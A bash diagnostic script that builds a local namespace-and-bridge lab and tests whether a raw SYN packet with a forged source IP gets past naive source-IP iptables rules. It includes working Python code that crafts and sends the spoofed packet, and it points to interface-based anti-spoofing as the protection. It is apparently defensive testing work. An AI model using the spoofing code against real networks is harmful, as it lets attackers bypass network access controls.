#!/bin/bash
# Precise diagnostic: where exactly does a spoofed raw packet get dropped?
# Runs concurrent capture at bridge level while sending the spoof.

set -uo pipefail
PATH="$PATH:/sbin:/usr/sbin"
RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; BOLD='\033[1m'; NC='\033[0m'
inf() { echo -e "${YELLOW}[INFO]${NC} $*"; }
ok()  { echo -e "${GREEN}[+]${NC} $*"; }
atk() { echo -e "${RED}[ATK]${NC} $*"; }
section() { echo -e "\n${BOLD}$*${NC}"; echo "────────────────────────────────────────"; }

PATH="$PATH:/sbin:/usr/sbin"
BR_IP="10.244.0.1"; ALLOWED_IP="10.244.0.10"; BLOCKED_IP="10.244.0.20"; TARGET_IP="10.244.0.30"
PORT=9878

cleanup() {
    pkill -f "python3.*9878" 2>/dev/null || true
    pkill -f "python3.*capture" 2>/dev/null || true
    for ns in ns_a ns_b ns_t; do ip netns del "$ns" 2>/dev/null || true; done
    ip link set br0 down 2>/dev/null; ip link del br0 2>/dev/null || true
    iptables -F FORWARD 2>/dev/null || true
    rm -f /tmp/diag_*
}
trap cleanup EXIT
cleanup 2>/dev/null || true

# ── Build topology ────────────────────────────────────────────────────────────
section "Setup"
ip link add br0 type bridge; ip addr add "$BR_IP/24" dev br0; ip link set br0 up
sysctl -w net.ipv4.ip_forward=1 -q
sysctl -w net.bridge.bridge-nf-call-iptables=1 -q 2>/dev/null || true

for args in "ns_a vh_a vp_a $ALLOWED_IP" "ns_b vh_b vp_b $BLOCKED_IP" "ns_t vh_t vp_t $TARGET_IP"; do
    read NS VH VP IP <<< "$args"
    ip netns add "$NS"
    ip link add "$VH" type veth peer name "$VP"
    ip link set "$VP" netns "$NS"; ip link set "$VH" master br0; ip link set "$VH" up
    ip netns exec "$NS" ip link set lo up; ip netns exec "$NS" ip link set "$VP" up
    ip netns exec "$NS" ip addr add "$IP/24" dev "$VP"
    ip netns exec "$NS" ip route add default via "$BR_IP"
    ok "ns=$NS ip=$IP"
done

# Listener in ns_t
ip netns exec ns_t python3 -c "
import socket; s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(('0.0.0.0',$PORT)); s.listen(5); s.settimeout(30)
while True:
    try:
        c,a=s.accept()
        c.recv(64); c.send(b'HTTP/1.1 200 OK\r\n\r\nOK'); c.close()
        open('/tmp/diag_got','a').write(a[0]+'\n')
    except: break
" &
sleep 0.2; ok "Listener on ns_t:$PORT"

# Verify connectivity
inf "Checking rp_filter: $(sysctl -n net.ipv4.conf.all.rp_filter)"
inf "Checking bridge-nf-call-iptables: $(sysctl -n net.bridge.bridge-nf-call-iptables 2>/dev/null || echo 'N/A')"

# ── Test: correctly ordered iptables with NO anti-spoofing ────────────────────
section "Setup: naive NetworkPolicy — ACCEPT allowed-source first, then DROP"
iptables -F FORWARD
iptables -A FORWARD -s "$ALLOWED_IP" -d "$TARGET_IP" -j ACCEPT
iptables -A FORWARD -d "$TARGET_IP" -j DROP
iptables -A FORWARD -j ACCEPT

iptables -L FORWARD -n --line-numbers | sed 's/^/  /'
echo ""

echo -n "  Normal TCP from allowed-source ($ALLOWED_IP) → target: "
ip netns exec ns_a python3 -c "
import socket; s=socket.socket(); s.settimeout(2)
s.connect(('$TARGET_IP',$PORT)); s.send(b'X'); r=s.recv(64); print('OK' if b'200' in r else 'FAIL')
" 2>/dev/null

echo -n "  Normal TCP from blocked-source ($BLOCKED_IP) → target: "
ip netns exec ns_b python3 -c "
import socket; s=socket.socket(); s.settimeout(2)
try: s.connect(('$TARGET_IP',$PORT)); print('REACHED')
except: print('BLOCKED')
" 2>/dev/null

# ── START CAPTURE BEFORE SENDING SPOOF ────────────────────────────────────────
section "Diagnostic: concurrent capture + spoof"
atk "Starting raw packet capture on TARGET before sending spoof..."

# Start capture in ns_t FIRST, write to file
ip netns exec ns_t python3 -c "
import socket, struct, os
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
s.settimeout(5)
results = []
try:
    while True:
        data, addr = s.recvfrom(4096)
        src = addr[0]
        if src.startswith('10.244') and len(data) > 33:
            flags = data[33]
            flag_str = ('SYN' if flags&2 else '') + ('ACK' if flags&16 else '') + ('RST' if flags&4 else '') + ('FIN' if flags&1 else '')
            sport = struct.unpack('!H', data[20:22])[0]
            dport = struct.unpack('!H', data[22:24])[0]
            results.append(f'{src}:{sport}->{addr[0]}:{dport} [{flag_str}]')
            with open('/tmp/diag_capture', 'a') as f:
                f.write(f'src={src} sport={sport} dport={dport} flags={flag_str}\n')
except socket.timeout:
    pass
for r in results: print(r)
" > /tmp/diag_cap_out 2>&1 &
CAP_PID=$!
sleep 0.2  # give capture time to start

# Also capture at host-bridge level (vh_b = ingress from blocked-source)
python3 -c "
import socket, struct
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
s.settimeout(3)
try:
    while True:
        data, addr = s.recvfrom(65535)
        iface = addr[0]
        if len(data) > 34:
            src_ip = '.'.join(str(b) for b in data[26:30])
            dst_ip = '.'.join(str(b) for b in data[30:34])
            if src_ip.startswith('10.244') and dst_ip.startswith('10.244'):
                proto = data[23]
                if proto == 6 and len(data) > 47:
                    flags = data[47]
                    print(f'BRIDGE [{iface}] {src_ip}->{dst_ip} TCP flags={flags:#04x}')
except socket.timeout:
    pass
" > /tmp/diag_bridge_out 2>&1 &
BRIDGE_PID=$!
sleep 0.1

# NOW send the spoof
atk "Sending spoofed SYN: ns_b pretends to be $ALLOWED_IP"
ip netns exec ns_b python3 << 'PYEOF'
import socket, struct

def ck(d):
    if len(d)%2: d+=b'\x00'
    s=sum(struct.unpack('!%dH'%(len(d)//2),d))
    s=(s>>16)+(s&0xffff); s+=(s>>16); return ~s&0xffff

SRC='10.244.0.10'  # SPOOF
DST='10.244.0.30'
SP=55556; DP=9878

ip=struct.pack('!BBHHHBBH4s4s',0x45,0,40,8888,0,64,6,0,
    socket.inet_aton(SRC),socket.inet_aton(DST))
ip=ip[:10]+struct.pack('!H',ck(ip))+ip[12:]
tcp=struct.pack('!HHIIBBHHH',SP,DP,999,0,0x50,0x02,65535,0,0)
ph=struct.pack('!4s4sBBH',socket.inet_aton(SRC),socket.inet_aton(DST),0,6,len(tcp))
tcp=tcp[:16]+struct.pack('!H',ck(ph+tcp))+tcp[18:]

s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
n=s.sendto(ip+tcp,(DST,0)); s.close()
print(f'RAW SENT {n}B: src={SRC} dst={DST} sport={SP} dport={DP} [SYN]')
PYEOF

sleep 1
wait $CAP_PID 2>/dev/null || true
wait $BRIDGE_PID 2>/dev/null || true

section "Results"
inf "Bridge-level capture (all 10.244.x.x traffic crossing bridge):"
cat /tmp/diag_bridge_out 2>/dev/null | sed 's/^/  /' || echo "  (empty)"

inf "Target-side raw capture (packets reaching ns_t):"
cat /tmp/diag_cap_out 2>/dev/null | sed 's/^/  /' || echo "  (empty)"

inf "iptables counters for FORWARD chain (packets/bytes):"
iptables -L FORWARD -n -v 2>/dev/null | sed 's/^/  /'

echo ""
# Key question: what does the bridge see vs. what reaches the target?
BRIDGE_SAW=$(grep -c "10.244.0.10->10.244.0.30" /tmp/diag_bridge_out 2>/dev/null || echo 0)
TARGET_SAW=$(grep -c "src=10.244.0.10" /tmp/diag_capture 2>/dev/null || echo 0)

echo -e "${BOLD}Packet fate:${NC}"
echo "  Bridge (vh_b) saw spoofed src=10.244.0.10: $BRIDGE_SAW packets"
echo "  Target ns_t received src=10.244.0.10:      $TARGET_SAW packets"

if [ "$BRIDGE_SAW" -gt 0 ] && [ "$TARGET_SAW" -gt 0 ]; then
    echo -e "\n${RED}${BOLD}★ SPOOFED PACKET REACHED TARGET ★${NC}"
    echo -e "  iptables with naive src-IP rules: BYPASSED by CAP_NET_RAW spoofing"
    echo -e "  Protection requires interface-based anti-spoofing (Calico cali-from-ep)"
elif [ "$BRIDGE_SAW" -gt 0 ] && [ "$TARGET_SAW" -eq 0 ]; then
    echo -e "\n${YELLOW}Bridge saw the packet but target did NOT — dropped somewhere in FORWARD chain${NC}"
    echo -e "  Check iptables counters above"
elif [ "$BRIDGE_SAW" -eq 0 ]; then
    echo -e "\n${YELLOW}Bridge did NOT see the packet — dropped before reaching bridge${NC}"
    echo -e "  Possible: kernel dropped spoofed packet before forwarding to bridge"
    echo -e "  Checking conntrack..."
    conntrack -L 2>/dev/null | grep "10.244.0.10" | head -5 || echo "  (no conntrack entries for that IP)"
fi

# One more thing: check if conntrack is active
inf "conntrack enabled: $(sysctl -n net.netfilter.nf_conntrack_max 2>/dev/null || echo 'N/A')"
